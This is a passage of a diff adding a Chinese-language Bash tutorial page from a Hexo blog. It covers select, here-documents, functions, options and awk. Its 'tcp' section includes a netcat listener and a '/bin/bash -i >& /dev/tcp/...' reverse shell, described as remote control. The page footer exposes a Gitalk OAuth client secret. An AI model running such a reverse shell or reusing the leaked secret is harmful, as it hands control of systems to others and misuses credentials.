class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> item <span class="keyword">in</span> <span class="string">&quot;a&quot;</span> <span class="string">&quot;b&quot;</span> <span class="string">&quot;c&quot;</span>; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Select: <span class="variable">$item</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span></span><br><span class="line">  <span class="built_in">break</span>  <span class="comment"># break语句使得在用户选择后跳出select</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [Output]</span></span><br><span class="line"><span class="comment">#  1) a</span></span><br><span class="line"><span class="comment">#  2) b</span></span><br><span class="line"><span class="comment">#  3) c</span></span><br><span class="line"><span class="comment">#  #? 2</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  Select: b</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><h2 id="HereDocument"><a href="#HereDocument" class="headerlink" title="HereDocument"></a>HereDocument</h2><ul>
+<li>HereDocument是一种专用代码块，将命令列表（command list）以I&#x2F;O重定向的方式提供给程序或命令，格式如下  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">interactive-program &lt;&lt;<span class="string">LimitString</span></span><br><span class="line"><span class="string">command #1</span></span><br><span class="line"><span class="string">command #2</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">LimitString</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>&lt;&lt;-LimitString</code>可以抑制前导制表符（\t）打印（不适用space）</li>
+<li><code>&lt;&lt;\LimitString</code>、<code>&lt;&lt;&#39;LimitString&#39;</code>、<code>&lt;&lt;&quot;LimitString&quot;</code>可以禁用参数代换</li>
+</ul>
+</li>
+</ul>
+<div class="tabs" id="bashheredocument"><ul class="nav-tabs"><li class="tab active"><a href="#bashheredocument-1">BroadcastMessage</a></li><li class="tab"><a href="#bashheredocument-2">GenerateScript</a></li><li class="tab"><a href="#bashheredocument-3">Anonymous</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bashheredocument-1"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wall &lt;&lt;<span class="string">EndOfMessage</span></span><br><span class="line"><span class="string">Hi! # Note: &#x27;wall&#x27; prints comment lines.</span></span><br><span class="line"><span class="string">EndOfMessage</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashheredocument-2"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">OUTFILE=a.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Note that since we are inside a subshell,</span></span><br><span class="line">(</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># Parameter expansion has been disabled.</span></span><br><span class="line"><span class="comment"># Instead, the result is literal output.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Generated file will be named: <span class="variable">$OUTFILE</span>&quot;</span></span><br><span class="line"></span><br><span class="line">a=7</span><br><span class="line">b=3</span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> <span class="string">&quot;c = <span class="variable">$a</span> * <span class="variable">$b</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;c = <span class="variable">$c</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">EOF</span><br><span class="line">) &gt; <span class="variable">$OUTFILE</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashheredocument-3"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">: &lt;&lt;<span class="string">TESTVARIABLES</span></span><br><span class="line"><span class="string">$&#123;HOST_NAME?&#125;$&#123;USER?&#125;$&#123;MAIL?&#125;  # Print error message if one of the variables not set.</span></span><br><span class="line"><span class="string">TESTVARIABLES</span></span><br><span class="line"><span class="comment"># ./here.sh: line 3: HOST_NAME: parameter not set</span></span><br></pre></td></tr></table></figure></div></div></div>
+
+<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><ul>
+<li>支持间接传递变量的值（第一个变量的值用作第二个变量的名字）(IndirectReference)</li>
+<li>支持在函数内部根据变量的名称获取变量的值（Dereference）</li>
+<li>支持本地变量，其作用域只在函数内部有效（LocalVariable）</li>
+<li>支持递归调用（Recursive）</li>
+</ul>
+<div class="tabs" id="bashfunction"><ul class="nav-tabs"><li class="tab active"><a href="#bashfunction-1">IndirectReference</a></li><li class="tab"><a href="#bashfunction-2">DereferenceParameter</a></li><li class="tab"><a href="#bashfunction-3">LocalVariable</a></li><li class="tab"><a href="#bashfunction-4">Recursive</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bashfunction-1"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">greet</span></span> () &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message=Hello</span><br><span class="line">Hello=Goodbye</span><br><span class="line"></span><br><span class="line">greet <span class="string">&quot;<span class="variable">$message</span>&quot;</span>    <span class="comment"># Hello</span></span><br><span class="line">greet <span class="string">&quot;<span class="variable">$&#123;!message&#125;</span>&quot;</span> <span class="comment"># Goodbye (indirect reference)</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashfunction-2"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">dereference</span></span> () &#123;</span><br><span class="line">  name=\$<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$name</span>      <span class="comment"># $Junk</span></span><br><span class="line"></span><br><span class="line">  value=`<span class="built_in">eval</span> <span class="string">&quot;expr \&quot;<span class="variable">$name</span>\&quot; &quot;</span>`</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$1</span>=<span class="variable">$value</span>  <span class="comment"># Junk=A</span></span><br><span class="line">  <span class="built_in">eval</span> <span class="string">&quot;<span class="variable">$1</span>=\&quot;B\&quot;&quot;</span> <span class="comment"># (assign new value)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Junk=<span class="string">&quot;A&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[1]&quot;</span> <span class="variable">$Junk</span> <span class="comment"># [1] A</span></span><br><span class="line"></span><br><span class="line">dereference Junk</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[2]&quot;</span> <span class="variable">$Junk</span> <span class="comment"># [2] B</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashfunction-3"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">func</span></span> () &#123;</span><br><span class="line">  <span class="built_in">local</span> a=1   <span class="comment"># (local variable)</span></span><br><span class="line">  b=2         <span class="comment"># (global variable)</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[func] \&quot;a\&quot;=<span class="variable">$a</span>&quot;</span> <span class="comment"># [func] &quot;a&quot;=1</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[func] \&quot;b\&quot;=<span class="variable">$b</span>&quot;</span> <span class="comment"># [func] &quot;b&quot;=2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[out] \&quot;a\&quot;=<span class="variable">$a</span>&quot;</span> <span class="comment"># [out] &quot;a&quot;=  (not visible)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[out] \&quot;b\&quot;=<span class="variable">$b</span>&quot;</span> <span class="comment"># [out] &quot;b&quot;=2 (visible)</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashfunction-4"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">factorial</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> number=<span class="variable">$1</span>       <span class="comment"># (must be declared as local)</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$number</span>&quot;</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">    fact=1</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">let</span> <span class="string">&quot;decrnum = number - 1&quot;</span></span><br><span class="line">    factorial <span class="variable">$decrnum</span>  <span class="comment"># (recursive)</span></span><br><span class="line">    <span class="built_in">let</span> <span class="string">&quot;fact = <span class="variable">$number</span> * $?&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="built_in">return</span> <span class="variable">$fact</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial <span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Factorial of <span class="variable">$1</span> is $?.&quot;</span></span><br><span class="line"><span class="comment"># Factorial of 5 is 120.</span></span><br></pre></td></tr></table></figure></div></div></div>
+
+<h2 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h2><h3 id="RANDOM"><a href="#RANDOM" class="headerlink" title="$RANDOM"></a><code>$RANDOM</code></h3><ul>
+<li><code>$RANDOM</code> 返回一个[0, 32767]范围内的伪随机整数</li>
+</ul>
+<h1 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h1><h2 id="tcp"><a href="#tcp" class="headerlink" title="tcp"></a>tcp</h2><p><a target="_blank" rel="noopener" href="https://tylersguides.com/guides/check-if-a-tcp-port-is-listening-in-bash">Check if a TCP Port is Listening in Bash</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[server]</span><br><span class="line">nc -l -p 8080</span><br><span class="line"></span><br><span class="line">[client]</span><br><span class="line">/bin/bash -i &gt; /dev/tcp/192.168.5.5/8080 0&gt;&amp;1  本地输入只回显，接收远端输入（看远端操作）</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.5.5/8080 0&gt;&amp;1 将所有交互展示在远端（远程控制）</span><br></pre></td></tr></table></figure>
+
+<h1 id="执行选项"><a href="#执行选项" class="headerlink" title="执行选项"></a>执行选项</h1><ul>
+<li>选项（option）可以改变shell脚本的行为，通过<code>set</code>命令启用（<code>-</code>前缀）或关闭（<code>+</code>前缀），例如<code>set -x</code></li>
+<li>脚本内可以通过<code>$-</code>查看启用的所有选项</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">选项</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">-n</td>
+<td align="left">读取脚本中命令，但不执行它们（语法检查）</td>
+</tr>
+<tr>
+<td align="left">-x</td>
+<td align="left">在执行之前将命令本身输出到stdout</td>
+</tr>
+</tbody></table>
+<h1 id="外部命令"><a href="#外部命令" class="headerlink" title="外部命令"></a>外部命令</h1><h2 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h2><ul>
+<li>sed (stream editor)</li>
+</ul>
+<h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><ul>
+<li>awk是一种功能齐全的文本处理语言，语法类似C语言</li>
+</ul>
+<div class="tabs" id="bashcommandawk"><ul class="nav-tabs"><li class="tab active"><a href="#bashcommandawk-1">PrintColume</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bashcommandawk-1"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> one two | awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span> <span class="comment"># one two</span></span><br><span class="line"><span class="built_in">echo</span> one two | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> <span class="comment"># one</span></span><br><span class="line"><span class="built_in">echo</span> one two | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> <span class="comment"># two</span></span><br></pre></td></tr></table></figure></div></div></div>
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[0] <a target="_blank" rel="noopener" href="https://tldp.org/LDP/abs/html/index.html">Advanced Bash-Scripting Guide</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Bash/" rel="tag"><i class="fa fa-tag"></i> Bash</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/NeuralNetwork/Basic.html" rel="prev" title="神经网络基础">
+                  <i class="fa fa-chevron-left"></i> 神经网络基础
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Media/ColorTheory.html" rel="next" title="色彩理论">
+                  色彩理论 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-burn"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ssyang</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Symbols count total">413k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">6:16</span>
+  </span>
+</div>
+  <div class="powered-by"><a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a>/<a href="https://theme-next.js.org/mist/" class="theme-link" rel="noopener" target="_blank">NexT</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="/lib/animejs/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="/lib/@next-theme/pjax/pjax.min.js" integrity="sha256-3NkoLDrmHLTYj7csHIZSr0MHAFTXth7Ua/DDt4MRUAg=" crossorigin="anonymous"></script>
+  <script src="/lib/jquery/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script src="/lib/@fancyapps/fancybox/dist/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+  <script src="/lib/medium-zoom/dist/medium-zoom.min.js" integrity="sha256-EdPgYcPk/IIrw7FYeuJQexva49pVRZNmt3LculEr7zM=" crossorigin="anonymous"></script>
+  <script src="/lib/lozad/dist/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="/lib/pangu/dist/browser/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  
+<script src="/lib/hexo-generator-searchdb/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+  <script class="next-config" data-name="pdf" type="application/json">{"object_url":{"url":"/lib/pdfobject/pdfobject.min.js","integrity":"sha256-ph3Dk89VmuTVXG6x/RDzk53SU9LPdAh1tpv0UvnDZ2I="},"url":"/lib/pdf/web/viewer.html"}</script>
+  <script src="/js/third-party/tags/pdf.js"></script>
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"/lib/mermaid/dist/mermaid.min.js","integrity":"sha256-CmZCFVnvol9YL23PfjDflGY5nJwE+Mf/JN+8v+tD/34="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"/lib/mathjax/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="/lib/quicklink/dist/quicklink.umd.js" integrity="sha256-4kQf9z5ntdQrzsBC3YSHnEz02Z9C1UeW/E9OgnvlzSY=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://blog.imssyang.com/ProgrammingLanguage/Bash/Basic.html"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+<link rel="stylesheet" href="/lib/gitalk/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"imssyang","repo":"blog","client_id":"ba40e2a2990186d78b0c","client_secret":"c21ed29409a2675c70d1b68e7c7b6657a5e3d5c2","admin_user":"imssyang","distraction_free_mode":true,"proxy":"https://cors-anywhere.imssyang.workers.dev/?https://github.com/login/oauth/access_token","language":"en","js":{"url":"/lib/gitalk/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"c484b525c37c6034c0542de4f67d8aca"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
